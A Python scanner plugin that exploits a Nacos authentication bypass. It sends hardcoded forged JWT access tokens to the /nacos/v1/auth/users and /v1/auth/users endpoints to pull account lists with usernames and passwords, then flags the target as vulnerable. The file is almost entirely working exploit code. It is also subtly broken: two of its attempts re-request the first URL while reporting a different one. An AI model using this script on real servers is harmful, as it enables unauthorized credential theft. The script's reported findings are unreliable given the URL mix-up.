#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Nacos账号密码泄漏',

      'level'     :   'critical',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/1/15',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  token = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g'
  token2 = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxMDUwNDAxOX0.vW8mpBNoJ7hVKPNhEtQl4Z5b00G4P9Ktrn_7c58crOk'
  target1 = f'/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={token}'
  target2 = f'/v1/auth/users?pageNo=1&pageSize=10&accessToken={token}'
  target3 = f'/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={token2}'
  target4 = f'/v1/auth/users?pageNo=1&pageSize=10&accessToken={token2}'
  url1 = url + target1
  url2 = url + target2
  url3 = url + target3
  url4 = url + target4
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'totalCount.*?pageNumber.*?pagesAvailable.*?pageItems.*?username.*?password.*?',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    return ret
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'totalCount.*?pageNumber.*?pagesAvailable.*?pageItems.*?username.*?password.*?',res.text,re.S):
      ret['huixian'] = res.text
      ret['url'] = url2
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    return ret
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'totalCount.*?pageNumber.*?pagesAvailable.*?pageItems.*?username.*?password.*?',res.text,re.S):
      ret['huixian'] = res.text
      ret['url'] = url3
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    return ret
  try:
    res=requests.get(url=url4,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'totalCount.*?pageNumber.*?pagesAvailable.*?pageItems.*?username.*?password.*?',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret